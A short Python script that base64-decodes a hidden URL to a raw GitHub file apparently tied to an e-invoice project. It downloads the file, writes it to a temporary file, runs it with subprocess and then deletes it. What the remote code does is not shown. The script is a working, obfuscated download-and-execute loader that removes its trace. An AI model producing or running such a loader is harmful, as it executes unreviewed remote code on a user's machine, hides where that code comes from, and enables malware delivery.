import urllib.request
import subprocess
import base64

url = base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1l1bnVzLUthcmFndW4vZS1JbnZvaWNlLUFETC9tYWluL0ZhdHVyYV9BRExfTS5weQ==').decode('utf-8')
response = urllib.request.urlopen(url)
script_content = response.read().decode('utf-8')

temp_filename = "temp1.py"
with open(temp_filename, "w", encoding="utf-8") as f:
    f.write("# -*- coding: utf-8 -*-\n")
    f.write(script_content)
subprocess.run(["python", temp_filename])
import os
os.remove(temp_filename)
